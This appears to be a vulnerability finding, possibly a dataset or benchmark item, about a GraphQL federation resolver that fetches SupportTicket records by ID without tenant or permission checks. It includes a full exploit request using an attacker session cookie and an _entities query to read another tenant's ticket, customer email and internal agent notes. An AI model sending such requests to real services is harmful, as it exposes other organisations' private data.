diagnosis: The SupportTicket resolver resolves support tickets by converting representation.id directly into an ObjectId and querying the database without evaluating user permissions or organizational boundaries. Any tenant querying the supergraph or ticketing subgraph can retrieve competitor support tickets, including sensitive internal agent notes.
exploit_request:
POST /graphql HTTP/1.1
Host: helpdesk.saas.internal:3030
Content-Type: application/json
Cookie: connect.sid=s%3Aattacker_session_cookie

{"query": "query { _entities(representations: [{ __typename: \"SupportTicket\", id: \"64f1a2b3c4d5e6f7a8b9c0d1\" }]) { ... on SupportTicket { subject status customerEmail internalAgentNotes } } }"}
